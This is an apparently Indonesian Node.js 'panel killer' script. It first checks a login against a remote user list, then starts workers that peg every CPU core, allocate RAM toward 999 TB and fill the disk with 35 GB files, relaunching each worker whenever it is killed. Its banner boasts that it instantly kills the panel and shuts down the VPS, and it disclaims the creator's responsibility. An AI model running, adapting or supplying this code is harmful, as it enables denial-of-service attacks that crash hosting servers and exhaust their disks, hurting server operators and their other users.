const { Worker, isMainThread } = require('worker_threads');
const { spawn } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const https = require('https');
const crypto = require('crypto');
const readlineSync = require('readline-sync');

function createHash(data) {
    return crypto.createHash('sha256').update(data).digest('hex');
}

function fetchData(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    reject(new Error('Eror: File nya gak bisa!'));
                }
            });
        }).on('error', (err) => {
            reject(new Error(`Eror: ${err.message}`));
        });
    });
}

async function validasiInteraktif() {
    console.log('Memulai menjalankan...');
    
    const xayzTechVX = 'https://xayzsecure.vercel.app/Xayzprotech.json';

    let authorizedUsers;

    try {
        console.log('Mengambil data...');
        authorizedUsers = await fetchData(xayzTechVX);
        if (!Array.isArray(authorizedUsers)) {
            throw new Error('Format tidak valid dan tidak sesuai.');
        }
    } catch (error) {
        throw new Error(`Gagal mengambil data: ${error.message}`);
    }

    console.log('Masukkan Username nya');
    const username = readlineSync.question('Username: ');
    
    const pengguna = authorizedUsers.find(u => u.username === username);

    if (!pengguna) {
        throw new Error('Username tidak ditemukan.');
    }

    console.log('Masukkan Password nya');
    const password = readlineSync.question('Masukkan Password: ', {
        hideEchoBack: true
    });
    
    const localPassHash = createHash(password);

    if (pengguna.password_hash !== localPassHash) {
        throw new Error('Password salah.');
    }

    if (pengguna.active !== true) {
        throw new Error('Akun ini tidak aktif. Silakan hubungi admin @XYCoolcraft (TELEGRAM).');
    }

    console.log(`\nBerhasil: Selamat datang, ${pengguna.username} yang suka ngewe!`);
    return true;
}

const TARGET_TB_BYTES = 999 * 1024 * 1024 * 1024 * 1024;

function runCpuStress() {
    while (true) {}
}

function runRamStress() {
    console.log('📈 [RAM-SYSTEM] Dimulai (Mode GODMODE/OMEGA). Dashboard RAM akan FREEZE.');
    const memoryStorage = [];
    const TARGET_RAM_BYTES = TARGET_TB_BYTES;
    const RAM_BLOCK_BYTES = 1 * 1024 * 1024;
    let totalAllocated = 0;

    try {
        while (totalAllocated < TARGET_RAM_BYTES) {
            memoryStorage.push(Buffer.alloc(RAM_BLOCK_BYTES, 'a'));
            totalAllocated += RAM_BLOCK_BYTES;
        }
    } catch (e) {
        if (process.send) {
            process.send({ type: 'error-ram', message: e.message, progress: totalAllocated });
        }
    }
}

async function runDiskStress_GODMODE() {
    const TARGET_DISK_BYTES = TARGET_TB_BYTES;
    const DISK_FILE_BYTES = 35 * 1024 * 1024 * 1024;
    const WRITE_BLOCK_BYTES = 1 * 1024 * 1024;

    function formatSize(bytes) {
        const gb = (bytes / 1024 ** 3).toFixed(2);
        const tb = (bytes / 1024 ** 4).toFixed(2);
        if (tb >= 1) return `${tb} TB`;
        return `${gb} GB`;
    }

    async function createFile(filePath, size, onProgress) {
        return new Promise((resolve, reject) => {
            const stream = fs.createWriteStream(filePath, { highWaterMark: WRITE_BLOCK_BYTES });
            const buf = Buffer.alloc(WRITE_BLOCK_BYTES, 0);
            let written = 0;
            
            function writeMore() {
                let ok = true;
                while (ok && written < size) {
                    const chunk = written + WRITE_BLOCK_BYTES > size ? buf.subarray(0, size - written) : buf;
                    ok = stream.write(chunk);
                    written += chunk.length;
                    
                    onProgress(written);
                }
                if (written >= size) {
                    stream.end();
                }
            }
            stream.on("drain", writeMore);
            stream.on("error", reject);
            stream.on("finish", () => resolve());
            writeMore();
        });
    }

    let totalWritten = 0;
    let fileIndex = 1;
    while (totalWritten < TARGET_DISK_BYTES) {
        const filePath = path.join(__dirname, `file_${fileIndex}_XayzTech.bin`);
        let currentFileProgress = 0;
        
        try {
            await createFile(filePath, DISK_FILE_BYTES, (progress) => {
                currentFileProgress = progress;
                if (process.send) {
                    process.send({
                        type: 'progress-disk',
                        totalProgress: totalWritten + currentFileProgress,
                        fileProgress: currentFileProgress,
                        fileName: path.basename(filePath),
                        fileSize: DISK_FILE_BYTES
                    });
                }
            });
            
            totalWritten += DISK_FILE_BYTES;
            fileIndex++;
        } catch (error) {
            if (process.send) {
                process.send({ type: 'error-disk', message: error.message, progress: totalWritten });
            }
            totalWritten = TARGET_DISK_BYTES;
        }
    }
}

function runDiskStress_OMEGA() {
    console.log('💾 [DISK-SYSTEM] Dimulai (Mode OMEGA - ANTI CREATE FILE).');
    const diskStorage = [];
    const TARGET_DISK_BYTES = TARGET_TB_BYTES;
    const DISK_BLOCK_BYTES = 1 * 1024 * 1024;
    let totalAllocated = 0;
    
    try {
        while (totalAllocated < TARGET_DISK_BYTES) {
            diskStorage.push(Buffer.alloc(DISK_BLOCK_BYTES, 'b'));
            totalAllocated += DISK_BLOCK_BYTES;
        }
    } catch (e) {
        if (process.send) {
            process.send({ type: 'error-disk', message: e.message, progress: totalAllocated });
        }
    }
}

let dashboardStatus = {
    cpu: { status: 'Starting...', cores: 0 },
    ram: { progress: 0, status: 'Starting...' },
    disk: { totalProgress: 0, fileProgress: 0, fileName: 'N/A', fileSize: 0, status: 'Starting...' }
};

let errorLogs = [];
function logError(prefix, message) {
    const logMsg = `[${new Date().toLocaleTimeString()}] ${prefix} ${message}`;
    errorLogs.push(logMsg);
    if (errorLogs.length > 5) errorLogs.shift();
}

function formatSize(bytes) {
    const gb = (bytes / 1024 ** 3).toFixed(2);
    return `${gb} GB`;
}

function drawDashboard() {
    console.clear();

    console.log('============================================');
    console.log('🔥🔪⚙️ MONITORING & SYSTEM PROGRESS 🔥🔪⚙️');
    console.log('If you see that the disk and RAM are slowing down, its not because the creation size is in GB (Giga Bytes), so thats normal.');
    console.log('WARNING: This version is brutal and its very instant to kill the panel and make the VPS also turn off.');
    console.log('Created And Developer By: @XYCoolcraft\n Note: Dont blame the creator, but blame it on careless misuse and dont play slander!.');
    console.log('============================================\n');

    const { cpu, ram, disk } = dashboardStatus;

    console.log(`💻 CPU: ${cpu.cores} Cores [${cpu.status}]`);

    let ramStatus = ram.status === 'Running' ?
        `${formatSize(ram.progress)} / 999 TB` : `[${ram.status}]`;
    console.log(`📈 RAM: ${ramStatus}`);

    let diskStatus = disk.status === 'Running' ?
        `${formatSize(disk.totalProgress)} / 999 TB  (File: ${disk.fileName} [${formatSize(disk.fileProgress)} / ${formatSize(disk.fileSize)}])` : `[${disk.status}]`;
    console.log(`💾 DISK: ${diskStatus}`);

    console.log('\n--- System Logs ---');
    console.log(errorLogs.join('\n'));
}

function launchWorker(workerArg, logPrefix) {
    const worker = spawn('node', [__filename, workerArg], {
        stdio: ['ignore', 'ignore', 'ignore', 'ipc']
    });

    worker.on('message', (msg) => {
        if (msg.type === 'progress-ram') {
            dashboardStatus.ram = { progress: msg.progress, status: 'Running' };
        }
        else if (msg.type === 'progress-disk') {
            dashboardStatus.disk = { ...msg, status: 'Running' };
        }
        else if (msg.type === 'error-ram') {
            logError(logPrefix, `GAGAL ALOKASI PADA ${formatSize(msg.progress)}: ${msg.message}`);
        }
        else if (msg.type === 'error-disk') {
            logError(logError, `GAGAL TULIS PADA ${formatSize(msg.progress)}: ${msg.message}`);
        }
    });

    worker.on('close', (code) => {
        logError(logPrefix, `SYSTEM BERHENTI! (Kode: ${code}). Me-restart...`);
        
        if (workerArg === '--run-ram') dashboardStatus.ram.status = 'Restarting...';
        if (workerArg === '--run-disk-godmode' || workerArg === '--run-disk-omega') dashboardStatus.disk.status = 'Restarting...';

        setImmediate(() => {
            launchWorker(workerArg, logPrefix);
        });
    });

    worker.on('error', (err) => {
        logError(logPrefix, `GAGAL MELUNCURKAN: ${err.message}. Mencoba lagi...`);
        setImmediate(() => {
            launchWorker(workerArg, logPrefix);
        });
    });
}

function startManajer() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.clear();
    console.log('============================================');
    console.log('🔥🔪⚙️ PILIH MODE NYA BANG! 🔥🔪⚙️');
    console.log('1. GODMODE (CPU + RAM + REAL DISK WRITE)');
    console.log('2. OMEGA   (CPU + RAM + [ANTI-CREATE-FILE])');
    console.log('Kemungkinan karena ini sangat brutal anda akan melihat Proses Ram yang ada di tampilan Console akan terlihat Freeze Karena ini Mode Cepat');
    console.log('============================================');

    rl.question('Masukkan pilihan (1 atau 2): ', (choice) => {
        let diskWorkerArg = '';

        if (choice === '1') {
            console.log('Mode GODMODE (Real Disk Write) dipilih.');
            diskWorkerArg = '--run-disk-godmode';
        } else if (choice === '2') {
            console.log('Mode OMEGA (Anti-Create-File) dipilih.');
            diskWorkerArg = '--run-disk-omega';
        } else {
            console.log('Pilihan salah. Keluar.');
            rl.close();
            process.exit();
            return;
        }
        
        rl.close();

        const numCPUs = os.cpus().length;
        dashboardStatus.cpu = { status: 'RUNNING', cores: numCPUs };
        
        setInterval(drawDashboard, 500);

        for (let i = 0; i < numCPUs; i++) {
            launchWorker('--run-cpu', `💻 [CPU-${i + 1}]`);
        }

        launchWorker('--run-ram', '📈 [RAM]');
        
        launchWorker(diskWorkerArg, '💾 [DISK]');
    });
}

async function jalankanAplikasi() {
    try {
        await validasiInteraktif();

        console.log('Berhasil Verifikasi. Menjalankan...');
        
        startManajer();

    } catch (error) {
        console.error('===================================');
        console.error(`EROR: ${error.message}`);
        console.error('===================================');
        process.exit(1); 
    }
}

if (process.argv.includes('--run-cpu')) {
    runCpuStress();
} 
else if (process.argv.includes('--run-ram')) {
    runRamStress();
} 
else if (process.argv.includes('--run-disk-godmode')) {
    runDiskStress_GODMODE();
}
else if (process.argv.includes('--run-disk-omega')) {
    runDiskStress_OMEGA();
}
else {
    jalankanAplikasi();
}